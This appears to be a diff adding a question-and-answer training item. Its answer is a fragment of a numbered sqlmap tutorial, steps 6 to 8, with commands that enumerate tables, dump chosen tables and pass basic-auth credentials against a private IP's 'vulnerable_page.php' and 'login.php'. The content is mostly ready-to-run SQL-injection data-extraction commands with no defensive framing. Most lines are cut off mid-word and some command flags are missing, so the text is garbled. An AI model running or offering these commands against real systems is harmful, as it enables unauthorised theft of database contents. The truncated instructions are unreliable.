@@ -1,0 +1,33 @@
+TECHNIQUE / QUESTION:
+Provide a clear, comprehensive explanation of the following content: (Context: from Document)
+
+CONTEXT:
+Source: Unknown
+Section: General
+Pages: N/A
+
+METHOD / ANSWER:
+sqlmap -u "http://10.1.2.3/vulnerable_page.php?id=1"
+```
+Replace `mysql` with the appropriate database managem
+`oracle`) based on the type of database you're target
+6. If you need to access specific tables within a dat
+`--tables` option followed by the database name:
+```
+sqlmap -u "http://10.1.2.3/vulnerable_page.php?id=1"
+database_name
+```
+Replace `database_name` with the actual name of the d
+7. To dump data from specific tables, use the `--dump
+names:
+```
+sqlmap -u "http://10.1.2.3/vulnerable_page.php?id=1"
+table_name1,table_name2
+```
+Replace `table_name1` and `table_name2` with the actu
+want to dump data from.
+8. If the target host has a login page or requires au
+the `--auth-type` and `--auth-cred` options to provid
+```
+sqlmap -u "http://10.1.2.3/login.php" --auth-type=bas
+--auth-cred="username:password" --dbms=mysql --dump
